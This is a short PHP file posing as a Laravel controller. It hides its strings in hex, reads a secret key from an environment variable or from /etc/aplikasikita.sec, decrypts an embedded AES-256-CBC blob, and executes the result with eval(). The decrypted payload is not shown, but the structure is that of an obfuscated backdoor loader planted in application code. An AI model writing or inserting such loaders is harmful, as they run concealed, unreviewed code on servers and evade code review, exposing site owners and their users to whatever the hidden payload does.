<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('H92BmhOYUCVqilT4lttZVg==');

$c=base64_decode(

'KqJPTgYDLzUhJWWU05xYabwdmMa/KqCxXxMooY2mG3V9fGLGNLi9KRhWdD3/CmCU2GXNHGQt8/6q' .
'5em0LjMXNyUcs0YwTRSNh9Mh8j/n3N1bRX2vpix/FCmTsXA33F7Z+4u4pfMZIHRUYwgqjfcP2kbJ' .
'f/W9STWd57Zmzun4PhlJ6UKXVTkZGSZRl1EFDHWQJCl234+DvFs0wrW2oKnPocbMlMUsRu1Hhbs3' .
'ouPJtmwdxSZ0YNZT9WiqelA/ipz0'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

